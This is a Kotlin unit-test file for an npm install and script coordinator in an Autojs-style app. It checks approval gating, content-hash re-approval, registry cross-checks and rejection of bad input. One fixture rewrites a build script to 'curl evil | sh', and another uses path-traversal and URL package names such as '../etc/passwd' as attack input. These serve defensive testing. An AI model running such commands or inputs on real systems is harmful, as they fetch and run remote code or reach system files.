        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build") } }
        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, ex.error)
        assertTrue(ex.message!!.contains("审批卡"), "拒绝话术要指向用户下一步：${ex.message}")

        // 自请入队（§18 第 7 项：用户当场选，不是脚本能自批）：UI 审批卡要看得见这张卡。
        val pending = runBlocking { c.pendingApprovals("p1") }
        assertEquals(1, pending.size, "拒绝必须同时把请求投进 approvals 流，否则用户无处可批")
        val req = pending.single()
        assertEquals("p1|build", req.pkg, "键 = 主体|脚本名（不串到同名 bin 的 action）")
        assertEquals(ApprovalAction.RUN_SCRIPT, req.action)
        val got = runBlocking { c.drainApprovals("p1", 0, 32) }
        assertEquals(1, got.requests.size, "拉取口（脚本侧 onApproval）也要看得见这张卡")
    }

    @Test
    fun `runScript 脚本名不存在 ERR_NOT_FOUND 并列出可选项（不静默 nothing-to-do）`() {
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc","test":"jest"}}""")
        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().runScript("p1", "nope") } }
        assertEquals(ErrorCode.ERR_NOT_FOUND, ex.error)
        assertTrue(ex.message!!.contains("build") && ex.message!!.contains("test"), "报错要给可选项：${ex.message}")
    }

    @Test
    fun `runScript 项目缺 manifest → ERR_FILE_NOT_FOUND（不是「没有该脚本」）`() {
        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().runScript("p1", "build") } }
        assertEquals(ErrorCode.ERR_FILE_NOT_FOUND, ex.error)
    }

    @Test
    fun `已获批的 runScript 缺省接缝如实 ERR_NOT_IMPLEMENTED（门禁过了但 spawn 桥没接）`() {
        val led = ApprovalLedger()
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
        approveRunScript(led, "p1", "build")

        val c = coordinator(ledger = led)   // scriptExecutor 缺省 = Unavailable
        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build", listOf("--watch")) } }
        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error, "不假装跑过")
        assertTrue(ex.message!!.contains("T1"), "要说清缺的是哪一段：${ex.message}")
    }

    @Test
    fun `已获批的 runScript 交出 npm 口径参数（-- 分隔符在参数之前）`() = runBlocking {
        val op = runScriptOpCapture("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""", "build", listOf("--watch"))
        assertEquals(listOf("run", "build", "--", "--watch"), op.npmArgs, "少了 -- 的话 --watch 会被 npm 自己吃掉")
        assertEquals("p1|build", op.subject, "执行体要能复述「我跑的是哪一份」")
        assertEquals("build", op.what)
        assertTrue(op.versionHash.startsWith("sha256:"), "内容哈希要随 op 走（审计要能回答「批的那份还在不在」）")
    }

    @Test
    fun `脚本内容一改：哈希变 → 旧票失配（改完再跑要重新审批）`() {
        val led = ApprovalLedger()
        val c = coordinator(ledger = led)
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
        approveRunScript(led, "p1", "build")          // 用户批的是 tsc 那一份
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"curl evil | sh"}}""")

        val ex = assertThrows(AutojsException::class.java) { runBlocking { c.runScript("p1", "build") } }
        assertEquals(ErrorCode.ERR_PERMISSION_DENIED, ex.error, "同版本同脚本名，但内容不同 = 另一份授权")
        assertEquals(1, runBlocking { c.pendingApprovals("p1") }.size, "改后一张新卡（改前那张已决议，不再是 PENDING）")
    }

    @Test
    fun `脚本键顺序变化不改哈希（键排序后规范化）`() {
        val led = ApprovalLedger()
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"a":"1","b":"2"}}""")
        val h1 = approveRunScript(led, "p1", "a")
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"b":"2","a":"1"}}""")
        val h2 = approveRunScript(led, "p1", "a")
        assertEquals(h1, h2, "只换键序不该让用户重批（哈希口径是键排序后的规范化文本）")
    }

    @Test
    fun `exec 纯 JS bin：已获批则进执行体，args 与 bin 名用 -- 分开`() = runBlocking {
        val root = layout.projectRoot("p1")
        val pkg = root.resolve("node_modules/tooly")
        Files.createDirectories(pkg)
        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
        Files.write(pkg.resolve("cli.js"), "#!/usr/bin/env node\n".toByteArray())
        val led = ApprovalLedger()
        val hash = NpmScriptResolver.binTarget(root, "tooly")!!.versionHash
        val ticket = led.submit("p1", "tooly|tooly", hash, ApprovalAction.EXEC)
        led.resolve(ticket.requestId, ApprovalDecision.APPROVE)

        val c = coordinator(ledger = led, script = recording())
        val got = c.exec("p1", "tooly", listOf("--fast"))     // 已获批 → 真的落到执行体
        assertEquals(listOf("exec", "--fast", "--", "tooly"), scriptOps.single().npmArgs)
        assertEquals("tooly|tooly", scriptOps.single().subject)
        assertTrue(got.id.isNotEmpty())
    }

    @Test
    fun `exec 简写 bin 的隐含命令名是包名（npm 口径，不是文件名）`() {
        val root = layout.projectRoot("p1")
        val pkg = root.resolve("node_modules/tooly")
        Files.createDirectories(pkg)
        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":"cli.js"}""").toByteArray())
        Files.write(pkg.resolve("cli.js"), ("//\n".toByteArray()))
        assertNotNull(NpmScriptResolver.binTarget(root, "tooly"), "bin:\"cli.js\" 装出来的命令叫 tooly")
        assertNull(NpmScriptResolver.binTarget(root, "cli"), "cli.js 是文件名，不是命令名")
    }

    @Test
    fun `exec 简写 bin 去掉 scope 前缀（@acme 下的 mytool 命令名是 mytool）`() {
        val root = layout.projectRoot("p1")
        val pkg = root.resolve("node_modules/@acme/mytool")
        Files.createDirectories(pkg)
        Files.write(pkg.resolve("package.json"), ("""{"name":"@acme/mytool","version":"1.0.0","bin":"./run.js"}""").toByteArray())
        Files.write(pkg.resolve("run.js"), ("//\n".toByteArray()))
        assertNotNull(NpmScriptResolver.binTarget(root, "mytool"), "scope 剥掉后才是命令名")
    }

    @Test
    fun `exec bin 未物化 ERR_FILE_NOT_FOUND（声明在 manifest 但文件不在）`() {
        val root = layout.projectRoot("p1")
        val pkg = root.resolve("node_modules/tooly")
        Files.createDirectories(pkg)
        Files.write(pkg.resolve("package.json"), ("""{"name":"tooly","version":"2.0.0","bin":{"tooly":"./cli.js"}}""").toByteArray())
        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "tooly") } }
        assertEquals(ErrorCode.ERR_FILE_NOT_FOUND, ex.error, "声明在 manifest 但文件没物化")
    }

    @Test
    fun `exec 原生 bin ERR_NOT_SUPPORTED（W^X + 无编译器；给可操作话术）`() {
        val root = layout.projectRoot("p1")
        val pkg = root.resolve("node_modules/nativey")
        Files.createDirectories(pkg.resolve("build/Release"))
        Files.write(
            pkg.resolve("package.json"),
            ("""{"name":"nativey","version":"1.0.0","bin":{"nativey":"./build/Release/nativey.node"}}""").toByteArray(),
        )
        Files.write(pkg.resolve("build/Release/nativey.node"), ByteArray(4))
        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "nativey") } }
        assertEquals(ErrorCode.ERR_NOT_SUPPORTED, ex.error)
        assertTrue(ex.message!!.contains("wasm"), "要指路：${ex.message}")
    }

    @Test
    fun `exec 多个包声明同名 bin → 拒绝并点名（不猜执行目标）`() {
        val root = layout.projectRoot("p1")
        for ((name, ver) in listOf("a1" to "1.0.0", "a2" to "2.0.0")) {
            val pkg = root.resolve("node_modules/" + name)
            Files.createDirectories(pkg)
            Files.write(pkg.resolve("package.json"), ("""{"name":"$name","version":"$ver","bin":{"dup":"./dup.js"}}""").toByteArray())
            Files.write(pkg.resolve("dup.js"), ("//\n".toByteArray()))
        }
        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "dup") } }
        assertEquals(ErrorCode.ERR_NOT_SUPPORTED, ex.error)
        assertTrue(ex.message!!.contains("a1") && ex.message!!.contains("a2"), ex.message)
    }

    @Test
    fun `T1 取消：不写 journal 事务（无源之记会污染残骸清扫的判据）`() = runBlocking {
        val led = ApprovalLedger()
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
        approveRunScript(led, "p1", "build")
        val gate = CompletableDeferred<Unit>()
        val c = coordinator(
            ledger = led,
            script = object : ScriptOpExecutor {
                override suspend fun execute(op: ScriptOp, sink: ProgressSink): String {
                    gate.await()
                    return "ok"
                }
            },
        )
        // 独立 scope（不是本 runBlocking 的子协程）：子协程失败会取消父作用域，
        // 那会让异常从测试方法自己抛出去、assertThrows 根本接不到。
        val mine = detached { c.runScript("p1", "build") }
        val handle = awaitHandle(c)
        c.cancel(InstallHandle(handle, "p1", 0))
        gate.complete(Unit)
        val ex = assertThrows(AutojsException::class.java) { runBlocking { mine.await() } }
        assertEquals(ErrorCode.ERR_ENGINE_STOPPED, ex.error, "执行体已收尾但结果不采纳（cancel 先到）")
        assertTrue(journal.all().isEmpty(), "T1 没有事务：journal 里不该有它的 begin/fail 记录，实际 ${journal.all()}")
    }

    @Test
    fun `T1 取消：同一句柄只有一个终态事件（不出现 Finished 两条）`() = runBlocking {
        val led = ApprovalLedger()
        writeManifest("p1", """{"name":"p1","version":"1.0.0","scripts":{"build":"tsc"}}""")
        approveRunScript(led, "p1", "build")
        val gate = CompletableDeferred<Unit>()
        val c = coordinator(
            ledger = led,
            script = object : ScriptOpExecutor {
                override suspend fun execute(op: ScriptOp, sink: ProgressSink): String {
                    gate.await()
                    sink.emit(InstallEvent.Progress("p1", op.handleId, InstallEvent.Phase.REIFY))
                    return "ok"
                }
            },
        )
        val mine = detached { c.runScript("p1", "build") }
        val handle = awaitHandle(c)
        c.cancel(InstallHandle(handle, "p1", 0))
        gate.complete(Unit)
        assertThrows(AutojsException::class.java) { runBlocking { mine.await() } }

        // 走拉取口读环（`:main`/脚本侧的取数面）：cancel 与执行体收尾的先后不决定能否取全，
        // 环是「两条都记下来」的那份事实 —— 正因如此才能断言终态只该有一条。
        val events = runBlocking { c.drainEvents("p1", 0, 32) }.events.map { it.event }
        val finals = events.filterIsInstance<InstallEvent.Finished>().filter { it.handleId == handle }
        assertEquals(1, finals.size, "同一句柄两个终态会让订阅方无从裁决：$events")
        assertEquals(false, finals.single().success, "取消的终态只能是失败")
    }

    @Test
    fun `exec 找不到该 bin ERR_NOT_FOUND（不是「没装 node_modules」的假成功）`() {
        val ex = assertThrows(AutojsException::class.java) { runBlocking { coordinator().exec("p1", "nope") } }
        assertEquals(ErrorCode.ERR_NOT_FOUND, ex.error)
    }

    // ═══ 轻操作 ═══

    @Test
    fun `list 直读 lockfile v3`() = runBlocking {
        writeLock("p1", """{"lockfileVersion":3,"packages":{"":{},"node_modules/axios":{"version":"1.7.0","integrity":"sha512-x"},"node_modules/dayjs":{"version":"1.11.0"}}}""")
        val c = coordinator()
        val list = c.list("p1", 0)
        assertEquals(setOf("axios", "dayjs"), list.map { it.name }.toSet())
        assertEquals("1.7.0", list.first { it.name == "axios" }.version)
    }

    @Test
    fun `offlineGap = lock 闭包减去缓存命中`() = runBlocking {
        writeLock("p1", """{"lockfileVersion":3,"packages":{"":{},"node_modules/a":{"version":"1.0.0","integrity":"sha512-hit"},"node_modules/b":{"version":"2.0.0","integrity":"sha512-miss"},"node_modules/c":{"version":"3.0.0"}}}""")
        val c = coordinator(cache = CacheIndex { it == "sha512-hit" })
        val gap = c.offlineGap("p1")
        assertEquals(setOf("b", "c"), gap.map { it.name }.toSet(), "无 integrity 的包也算缺口（不可校验=不可信缓存）")
    }

    @Test
    fun `storage 冷缓存遍历算尺寸`() = runBlocking {
        val nm = layout.nodeModules("p1")
        Files.createDirectories(nm.resolve("axios"))
        Files.write(nm.resolve("axios/index.js"), ByteArray(100))
        val c = coordinator()
        val stats = c.storage()
        assertEquals(100L, stats["p1"]!!.totalBytes)
    }

    @Test
    fun `配额 80% 黄：Warning(DISK_QUOTA) 不拦安装`() = runBlocking {
        // 项目已有 node_modules ~ 430MB（> 512MB×80%=409.6MB）——用稀疏文件撑尺寸
        val nm = layout.nodeModules("big")
        Files.createDirectories(nm)
        val probe = nm.resolve("blob")
        java.io.RandomAccessFile(probe.toFile(), "rw").use { it.setLength(430L * 1024 * 1024) }
        val events = mutableListOf<InstallEvent>()
        val c = coordinator()
        val collect = launch { c.progress("big").collect { events += it } }
        kotlinx.coroutines.delay(50)
        c.install("big", listOf(PackageSpec("axios")))
        kotlinx.coroutines.delay(50)
        collect.cancel()
        val warns = events.filterIsInstance<InstallEvent.Warning>()
        assertTrue(warns.any { it.kind == InstallEvent.Kind.DISK_QUOTA }, "80% 阈值必须发黄（实为 $events）")
        assertTrue(events.any { it is InstallEvent.Finished && it.success }, "黄警不拦：安装仍完成")
    }

    @Test
    fun `配额 100% 拦 ERR_DISK_FULL`() = runBlocking {
        val nm = layout.nodeModules("full")
        Files.createDirectories(nm)
        val probe = nm.resolve("blob")
        java.io.RandomAccessFile(probe.toFile(), "rw").use { it.setLength(600L * 1024 * 1024) }
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { coordinator().install("full", listOf(PackageSpec("axios"))) }
        }
        assertEquals(ErrorCode.ERR_DISK_FULL, ex.error)
    }

    // ═══ 快照导出（§10.9.4 高信任通道） ═══

    @Test
    fun `未注入 NpmSnapshot 时导出如实失败（不交付未签名包）`() = runBlocking {
        val c = coordinator()
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.exportSnapshot("p1", "/tmp/never.zip") }
        }
        assertEquals(ErrorCode.ERR_NOT_IMPLEMENTED, ex.error)
    }

    @Test
    fun `无 node_modules 拒绝导出（先 install 后快照）`() = runBlocking {
        val c = coordinator(snapshots = snapshots())
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.exportSnapshot("nothing-here", "/tmp/never.zip") }
        }
        assertEquals(ErrorCode.ERR_FILE_NOT_FOUND, ex.error)
    }

    @Test
    fun `导出落地且入史（成败都审计）`() = runBlocking {
        val exec = harvesting("axios" to "1.7.0")
        val h = newHistory()
        val out = dir.resolve("out/snap.zip")
        val c = coordinator(executor = exec, history = h, snapshots = snapshots())
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        val ref = c.exportSnapshot("p1", out.toString())
        assertTrue(Files.isRegularFile(out), "快照必须真的落盘（不是只返回一个 Ref）")
        assertTrue(ref.sha256.length == 64, "SnapshotRef 须带内容摘要，供导入侧比对")
        val e = h.all().single { it.op == InstallHistory.Op.EXPORT }
        assertTrue(e.success, "导出成功须入史")
    }

    @Test
    fun `导出的 zip 过验签闭环（export→verify 一体）`() = runBlocking {
        val exec = harvesting("axios" to "1.7.0")
        val out = dir.resolve("out/snap2.zip")
        val snapper = snapshots()
        // 带锁签名器：install 成功后重签（harvest 写回了新 lock，旧签会让紧随的 ci 失败）
        val signer = LockSigner(dir.resolve(".autojs"), LockSigner.KeyProvider { SecretKeySpec("test-app-key-32bytes-aaaaaaaaaaaa".toByteArray(), "HmacSHA256") })
        val c = coordinator(executor = exec, snapshots = snapper, lockSigner = signer)
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        assertTrue(Files.exists(dir.resolve(".autojs/lock.sig")), "install 后必须重签")
        c.exportSnapshot("p1", out.toString())
        val m = snapper.verify("p1", out)   // 不抛即过
        assertTrue(m.entries >= 2, "manifest + node_modules 至少各一条（实为 ${m.entries}）")
        assertTrue(m.lockSig != null, "两层验签闭环：lock.sig 须随包同行")
    }

    // ═══ TTL（铁律 3：zombie RUNNING 不可构造） ═══

    @Test
    fun `执行体超时 → ERR_TIMEOUT + journal fail + 残骸清扫（绝不挂起卡死）`() = runBlocking {
        val exec = FakeExecutor { kotlinx.coroutines.delay(Long.MAX_VALUE / 1000) }
        val c = coordinator(executor = exec)
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("axios")), InstallFlags(timeoutMillis = 120)) }
        }
        assertEquals(ErrorCode.ERR_TIMEOUT, ex.error, "超时必须 ERR_TIMEOUT，不能假装成功")
        assertEquals(InstallJournal.State.FAIL, journal.all().last().state, "超时也走 fail 封口")
        assertTrue(
            Files.list(layout.projectRoot("p1")).noneMatch { it.fileName.toString().startsWith("node_modules.part-") },
            "暂存残骸必须清扫",
        )
    }

    @Test
    fun `超时后锁已释放：同一项目可立即重试（TTL 不变成永久排队）`() = runBlocking {
        val exec = FakeExecutor { kotlinx.coroutines.delay(Long.MAX_VALUE / 1000) }
        val c = coordinator(executor = exec)
        assertThrows(AutojsException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("axios")), InstallFlags(timeoutMillis = 120)) }
        }
        // 换一个会成功的执行体，同一项目重试必须不被上一次超时卡住
        val ok = coordinator(executor = FakeExecutor())
        ok.install("p1", listOf(PackageSpec("axios")))
        assertTrue(journal.all().last().state == InstallJournal.State.COMMIT, "重试必须能走通")
    }

    // ═══ 事件流 ═══

    @Test
    fun `事件流按 projectId 过滤`() = runBlocking {
        val c = coordinator()
        val p1Events = mutableListOf<InstallEvent>()
        val p2Events = mutableListOf<InstallEvent>()
        val c1 = launch { c.progress("p1").collect { p1Events += it } }
        val c2 = launch { c.progress("p2").collect { p2Events += it } }
        kotlinx.coroutines.delay(50)   // 先让收集协程就位
        c.install("p1", listOf(PackageSpec("axios")))
        kotlinx.coroutines.delay(50)
        c1.cancel(); c2.cancel()
        assertTrue(p1Events.isNotEmpty())
        assertTrue(p2Events.isEmpty(), "事件不得跨项目串流")
    }

    // ═══ 多镜像交叉校验接进 install 路径（§10.5-1 三分裁决的处置） ═══

    @Test
    fun `交叉校验一致 → 放行（不广播成功，成功不是事件）`() = runBlocking {
        val v = FakeVerifier(
            mapOf("axios" to NpmRegistryVerifier.Verdict.Agreed("axios", "1.7.0", I, "https://x.tgz", false)),
        )
        val c = coordinator(executor = FakeExecutor(), registryVerifier = v)
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        // 版本要原样问过去（不许把范围猜成 latest 再问，那会漂移面）
        assertEquals(listOf(Triple("axios", "1.7.0", null)), v.asked)
        assertTrue(
            journal.all().map { it.state } == listOf(InstallJournal.State.BEGIN, InstallJournal.State.COMMIT),
            "一致即照常进事务",
        )
    }

    @Test
    fun `两镜像声明不一致 → ERR_REGISTRY_UNAVAILABLE，安装会话压根不起`() = runBlocking {
        val v = FakeVerifier(
            mapOf(
                "evil" to NpmRegistryVerifier.Verdict.Disagreed(
                    "evil", "1.0.0",
                    NpmRegistryVerifier.Resolved("1.0.0", "sha512-" + "a".repeat(16), "https://m/x.tgz"),
                    NpmRegistryVerifier.Resolved("1.0.0", "sha512-" + "b".repeat(16), "https://n/x.tgz"),
                    "同一版本 evil@1.0.0 的 dist.integrity 不一致：首选=sha512-aaaaaaaaaaaaaaaa vs 第二=sha512-bbbbbbbbbbbbbbbb",
                ),
            ),
        )
        val exec = FakeExecutor()
        val h = newHistory()
        val c = coordinator(executor = exec, history = h, registryVerifier = v)
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("evil", "1.0.0"))) }
        }
        assertEquals(ErrorCode.ERR_REGISTRY_UNAVAILABLE, ex.error, "不一致即拒：错误码要可诊断")
        assertTrue(ex.message!!.contains("sha512-" + "a".repeat(16)), "报错必须带得上两家的摘要（否则无从判断）：${ex.message}")
        assertTrue(ex.message!!.contains("sha512-" + "b".repeat(16)), "两侧都要给，不能只给一边：${ex.message}")
        assertTrue(exec.calls.isEmpty(), "被拒的安装不进会话（否则 journal 会像成功一样推进）")
        assertTrue(journal.all().isEmpty(), "未进会话即无事务，也谈不上残骸")
        val e = h.all().single()
        assertTrue(!e.success, "拒也要入史——审计要能回答「用户看到成功了吗」")
        assertTrue(e.detail!!.contains("交叉校验不一致"))
    }

    @Test
    fun `逐个 spec 裁：不一致即点名拒，后面的包不再问`() = runBlocking {
        val v = FakeVerifier(
            mapOf(
                "evil" to NpmRegistryVerifier.Verdict.Disagreed(
                    "evil", null, null, null, "evil 两注册表 latest 版本漂移",
                ),
                "axios" to NpmRegistryVerifier.Verdict.Agreed("axios", "1.7.0", I, "https://x.tgz", true),
            ),
        )
        val c = coordinator(executor = FakeExecutor(), history = newHistory(), registryVerifier = v)
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("evil"), PackageSpec("axios"))) }
        }
        assertTrue(ex.message!!.contains("evil"), "拒必须点名是哪个包：${ex.message}")
        assertEquals(listOf("evil"), v.asked.map { it.first }, "已明确拒了就停机，别把剩下的包装上")
    }

    @Test
    fun `没验成 → TRUST_DOWNGRADED 告警且入史，但不拦安装（禁止静默）`() = runBlocking {
        val v = FakeVerifier(mapOf("axios" to NpmRegistryVerifier.Verdict.Unverifiable("axios", "第二意见未返回该版本（不可达或尚未同步），无法交叉校验")))
        val h = newHistory()
        val c = coordinator(executor = FakeExecutor(), history = h, registryVerifier = v)
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }
        kotlinx.coroutines.delay(50)
        c.install("p1", listOf(PackageSpec("axios")))
        kotlinx.coroutines.delay(50)
        collect.cancel()

        val w = events.filterIsInstance<InstallEvent.Warning>().filter { it.kind == InstallEvent.Kind.TRUST_DOWNGRADED }
        assertEquals(1, w.size, "降信任必须显式告知：$w")
        assertEquals(listOf("axios"), w.single().pkgs, "要点名（UI 才能显示哪些降级）")
        assertTrue(w.single().message.contains("来源未校验"), "说清降的是什么级")
        assertTrue(events.any { it is InstallEvent.Finished && it.success }, "没验成不拦：装仍完成")
        val marked = h.all().first { it.detail?.contains("来源未校验") == true }
        assertEquals(InstallHistory.Op.INSTALL, marked.op)
        assertTrue(marked.success, "「来源未校验」与「安装成功」是两件事，都要如实记")
    }

    @Test
    fun `一批里混着降信任：告警一次点齐所有未校验包（不逐包刷屏）`() = runBlocking {
        val v = FakeVerifier(
            mapOf(
                "a" to NpmRegistryVerifier.Verdict.Unverifiable("a", "副镜像不可达"),
                "b" to NpmRegistryVerifier.Verdict.Unverifiable("b", "无 integrity 锚点"),
            ),
        )
        val c = coordinator(executor = FakeExecutor(), history = newHistory(), registryVerifier = v)
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }
        kotlinx.coroutines.delay(50)
        c.install("p1", listOf(PackageSpec("a"), PackageSpec("b")))
        kotlinx.coroutines.delay(50)
        collect.cancel()
        val w = events.filterIsInstance<InstallEvent.Warning>().filter { it.kind == InstallEvent.Kind.TRUST_DOWNGRADED }
        assertEquals(1, w.size, "一次安装一条降信任告警，包清单里列全：$w")
        assertEquals(listOf("a", "b"), w.single().pkgs)
    }

    @Test
    fun `首选注册表取自项目配置，并原样透传给校验器`() = runBlocking {
        val v = FakeVerifier(
            mapOf("axios" to NpmRegistryVerifier.Verdict.Agreed("axios", "1.7.0", I, "https://x.tgz", false)),
        )
        var askedProject: String? = null
        val c = coordinator(
            executor = FakeExecutor(),
            registryVerifier = v,
            registryOf = { p -> askedProject = p; "https://harbor.example.com/registry/" },
        )
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        assertEquals("p1", askedProject, "按项目查注册表（项目 .npmrc 可覆盖全局，§10.2）")
        assertEquals("https://harbor.example.com/registry/", v.asked.single().third, "调用方配的首选必须喂给校验器")
    }

    @Test
    fun `未注入校验缝 → install 不校验、也不假装置验过`() = runBlocking {
        var registryAsked = false
        val c = coordinator(
            executor = FakeExecutor(),
            registryOf = { registryAsked = true; "https://x.example" },   // 缝在，校验件不在
        )
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }
        kotlinx.coroutines.delay(50)
        c.install("p1", listOf(PackageSpec("axios")))
        kotlinx.coroutines.delay(50)
        collect.cancel()
        assertTrue(!registryAsked, "没有校验器就不该为一次不发生的校验读配置")
        assertTrue(events.none { it is InstallEvent.Warning }, "缺口不是降级：不许发一条假的 TRUST_DOWNGRADED")
        assertTrue(events.any { it is InstallEvent.Finished && it.success })
    }

    @Test
    fun `真校验器接上装路径：两镜像一致即放行（端到端零网络）`() = runBlocking {
        val v = agreeingSource("sha512-" + "a".repeat(24))
        val c = coordinator(executor = FakeExecutor(), history = newHistory(), registryVerifier = v)
        val events = mutableListOf<InstallEvent>()
        val collect = launch { c.progress("p1").collect { events += it } }
        kotlinx.coroutines.delay(50)
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        kotlinx.coroutines.delay(50)
        collect.cancel()
        assertTrue(events.any { it is InstallEvent.Finished && it.success })
        assertTrue(events.none { it is InstallEvent.Warning })
    }

    @Test
    fun `真校验器接上装路径：两镜像不一致即拒`() = runBlocking {
        val v = disagreeingSource("sha512-" + "a".repeat(24), "sha512-" + "b".repeat(24))
        val exec = FakeExecutor()
        val c = coordinator(executor = exec, registryVerifier = v)
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { c.install("p1", listOf(PackageSpec("axios", "1.7.0"))) }
        }
        assertEquals(ErrorCode.ERR_REGISTRY_UNAVAILABLE, ex.error)
        assertTrue(exec.calls.isEmpty(), "真校验器判不一致也不许进会话")
    }

    @Test
    fun `首选注册表缺省读项目 npmrc（registry= 最后一行生效，与 npm 口径一致）`() = runBlocking {
        val v = FakeVerifier(
            mapOf("axios" to NpmRegistryVerifier.Verdict.Agreed("axios", "1.7.0", I, "https://x.tgz", false)),
        )
        val rc = layout.npmrc("p1")
        Files.createDirectories(rc.parent)
        // 两行 registry：config() 的写入语义是「先删后加」，故后者应覆盖前者
        Files.write(rc, listOf("registry=https://registry.npmjs.org", "registry=https://harbor.example.com/registry/"))
        val c = coordinator(executor = FakeExecutor(), registryVerifier = v)   // registryOf 走缺省实现
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        assertEquals(
            "https://harbor.example.com/registry/", v.asked.single().third,
            "没显式喂注册表时，须读项目 .npmrc 的 registry=（后者覆盖前者）",
        )
    }

    @Test
    fun `无项目 npmrc 或无 registry 行 → 传给 null（校验器用自己的默认）`() = runBlocking {
        val v = FakeVerifier(
            mapOf("axios" to NpmRegistryVerifier.Verdict.Agreed("axios", "1.7.0", I, "https://x.tgz", false)),
        )
        val rc = layout.npmrc("p1")
        Files.createDirectories(rc.parent)
        Files.write(rc, listOf("https-proxy=http://127.0.0.1:7890"))   // 有 npmrc 但没有 registry 行
        val c = coordinator(executor = FakeExecutor(), registryVerifier = v)
        c.install("p1", listOf(PackageSpec("axios", "1.7.0")))
        assertEquals(null, v.asked.single().third, "读不到就别猜：交给校验器的默认，而不是硬套 npmmirror")
    }

    @Test
    fun `真校验器接上装路径：非法包名原样抛 IAE（不折成「没验成」）`() = runBlocking {
        // 攻击面：把包名写成路径/URL。若在这一步被折叠成 Unverifiable，调用方会当成
        // 「没验成」继续装——注入尝试就静默溜过 install 路径了。必须响亮失败。
        val asked = mutableListOf<String>()
        val v = NpmRegistryVerifier(source = object : NpmRegistryVerifier.RegistrySource {
            override fun packument(registryBase: String, escapedName: String): String? {
                asked += "$registryBase/$escapedName"; return null
            }
        })
        val c = coordinator(executor = FakeExecutor(), registryVerifier = v)
        for (bad in listOf("../etc/passwd", "https://evil.example/x", "pkg?x=1")) {
            assertThrows(IllegalArgumentException::class.java) {
                runBlocking { c.install("p1", listOf(PackageSpec(bad, "1.0.0"))) }
            }
        }
        assertTrue(asked.isEmpty(), "非法输入连请求都不该发出：$asked")
    }

    // ═══ 控制台命令面（§10.9 第 3 条，2026-10-09 批 84） ═══

    @Test
    fun `控制台拒收：抛原文且不排队（不落句柄、不写输出环）`() = runBlocking {
        val c = coordinator()
        for (line in listOf("", "   ", "ls -la", "npm publish", "npm run", "npm install git+https://x.git")) {
            val ex = assertThrows(IllegalArgumentException::class.java) {
                runBlocking { c.runConsoleCommand("p1", line) }
            }
            assertTrue(!ex.message.isNullOrBlank(), "拒收必须给出理由原文（输入「$line」）")
        }
        assertTrue(cHandles(c).isEmpty(), "拒收的命令不得在句柄账里留下东西")
        assertTrue(
            c.consoleOutput("p1", 0, 64).lines.isEmpty(),
            "拒收连回显都不该写 —— 界面侧当场拒与宿主侧拒读的是同一句话，环里多一行只会让人以为它跑过",
        )
    }

    @Test
    fun `控制台轻操作不占全局安装会话（重操作在跑时仍读得到）`() = runBlocking {
        val entered = CompletableDeferred<Unit>()
        val release = CompletableDeferred<Unit>()
        val c = coordinator(executor = FakeExecutor { entered.complete(Unit); release.await() })
        writeManifest("heavy", """{"name":"heavy","version":"1.0.0"}""")
        writeLock("p2", """{"lockfileVersion":3,"packages":{"":{},"node_modules/axios":{"version":"1.7.0"}}}""")

        val install = launch { c.install("heavy", listOf(PackageSpec("axios"))) }
        entered.await()   // 重操作已占住 globalSession

        // 轻操作若也去抢 globalSession，这一句会一直挂到 release 之后（withTimeout 当场红）
        withTimeout(5_000) { c.runConsoleCommand("p2", "npm ls") }
        val snap = c.consoleOutput("p2", 0, 64)
        assertTrue(
            snap.lines.any { it.line.kind == NpmConsoleLineKind.OUTPUT && it.line.text.contains("axios@1.7.0") },
            "轻操作必须当场出结果（实为 ${snap.lines.map { it.line } }）",
        )
        assertFalse(snap.running, "running 的判据是句柄账：在跑的是别的项目，p2 上没有命令")

        release.complete(Unit)
        install.join()
    }

    @Test
    fun `控制台重操作走 enqueueHeavy：磁盘预检与收尾路径一道不少`() = runBlocking {
        writeManifest("p1", """{"name":"p1","version":"1.0.0"}""")

        // ① 磁盘预检不得因入口是控制台就被绕过（同一动作在两个界面下强度必须相同）
        val tight = coordinator(free = 100L * 1024 * 1024)
        val ex = assertThrows(AutojsException::class.java) {
            runBlocking { tight.runConsoleCommand("p1", "npm install axios") }
        }
